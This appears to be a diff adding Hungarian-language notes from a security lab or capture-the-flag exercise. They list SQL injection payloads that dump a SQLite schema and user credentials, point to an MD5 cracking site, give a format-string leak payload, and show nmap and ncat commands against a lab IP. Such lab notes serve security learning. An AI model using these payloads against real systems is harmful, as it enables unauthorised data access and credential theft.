@@ -1,0 +1,55 @@
+1. feladat
+
+' OR 1=1; --
+(zhn lehet jelszót kell kitalálni)
+
+
+' UNION SELECT 1,1,1,1; --
+unionba annyi mező kell, ahány van mögötte a lekérdezésben -> pásztázni kell
+(zhn 4-nél több lesz)
+
+
+' UNION SELECT 1,SQL,1,1 FROM SQLITE_SCHEMA; --
+
+
+CREATE TABLE animals (name TEXT, type TEXT, color TEXT)
+CREATE TABLE datausrbb (id TEXT PRIMARY KEY, name TEXT, key TEXT)	 	
+#4:CREATE TABLE users (id TEXT PRIMARY KEY, name TEXT, passphrase TEXT, pwd TEXT)
+
+
+' UNION SELECT 1,NAME,PASSPHRASE,PWD FROM USERS; --
+nem ez a tábla kell majd nekünk (lesz ilyen összezavarás)
+
+' UNION SELECT 1,NAME,KEY,1 FROM DATAUSRBB; --
+ez már jó
+rövid hash -> md5
+https://md5decrypt.net/en/
+
+
+
+
+100 pizza:
+html-ben át kell írni
+
+
+
+2. feladat
+chmod a+x ABCDEFG.prog
+./ABCDEFG.prog
+
+secret0:
+999 -> 3600fefe
+
+secret1:
+%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x
+dec to hex 777->309
+a082fefe:309 -> a082fefe
+
+secret2:
+addig spammeled a 9-est még ki nem dobja a 506dfefe-t
+
+
+
+4.feladat
+nmap 10.6.12.105 -p 30000-
+ncat 10.6.12.105 kapott_ipcím
